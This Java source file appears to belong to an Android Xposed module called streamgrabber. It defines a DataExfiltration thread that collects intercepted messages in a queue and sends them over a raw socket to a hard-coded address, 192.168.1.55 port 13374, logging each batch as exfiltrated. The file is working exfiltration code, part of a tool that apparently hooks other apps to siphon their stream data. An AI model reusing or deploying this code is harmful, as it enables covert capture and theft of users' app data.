package at.waug.streamgrabber.streamgrabber;

import java.io.DataOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import de.robv.android.xposed.XposedBridge;

/**
 * Created by philip on 1/20/15.
 */
public class DataExfiltration extends  Thread {

    private ArrayList<Message> messages = new ArrayList<Message>();

    private Lock data_mutex = new ReentrantLock();
    private Condition data_available = data_mutex.newCondition();

    public void queueData(Message m){
        data_mutex.lock();
        messages.add(m);
        data_available.signal();
        data_mutex.unlock();

    }

    public void run(){

        while (true)
        {
            ArrayList<Message> to_send = null;
            data_mutex.lock();
            try {
                while (messages.size() == 0)
                    data_available.await();
            }
            catch (InterruptedException e) {
                XposedBridge.log("Interrupted in waiting for data!");
            }

            to_send = messages;
            messages = new ArrayList<Message>();

            data_mutex.unlock();

            if (to_send != null)
            {
                try {
                    Socket exfiltrator = new Socket("192.168.1.55", 13374);
                    DataOutputStream out = new DataOutputStream(exfiltrator.getOutputStream());
                    out.writeInt(to_send.size());
                    for (Message m : to_send)
                        m.buffer.writeTo(out);
                    out.flush();
                    exfiltrator.close();
                    XposedBridge.log("Exfiltrated " + to_send.size() + " messages");
                }
                catch (Exception e)
                {
                    e.printStackTrace();
                }
            }


        }

    }
}
